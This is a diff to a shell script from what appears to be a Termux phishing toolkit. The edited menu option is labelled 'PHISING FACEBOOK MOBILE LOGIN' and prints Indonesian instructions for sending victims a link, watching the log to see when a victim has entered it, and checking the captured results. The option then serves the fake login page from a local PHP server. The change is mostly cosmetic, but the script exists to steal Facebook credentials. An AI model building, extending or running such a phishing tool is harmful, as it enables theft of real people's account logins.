@@ -97,12 +97,15 @@ if [ $pil = 3 ]
 then
 echo $i"Openning..."
 sleep 1
+clear
+sleep 1
+echo $ku"---------------------------------------------------------------------------"
 echo $cy"TERMUX INDONESIA D4RK-IT Mr.J"
 echo $ku"---------------------------------------------------------------------------"
 echo $i"[+]PHISING FACEBOOK MOBILE LOGIN"
 echo $i"[+]SALIN LINK YANG ADA DI TANDA ()"
 echo $i"[+]JIKA LOG BERJALAN TANDANYA KORBAN SUDAH MASUK KE DALAM LINK"
-echo $i"[+]JIKA INGIN MELIHAT HASIL KETIK CTRL+C DAN KETIK php hasil.txt"
+echo $i"[+]JIKA INGIN MELIHAT HASIL BUKA SESSION BARU LALU PILIH CEK HASIL PHISING"
 echo $ku"---------------------------------------------------------------------------"
 php -S 127.0.0.1:8080
 fi
@@ -225,5 +228,4 @@ echo $ku"[+]SEE YOU BYE"
 echo $cy"============================================="
 sleep 1
 exit
-cd
 fi
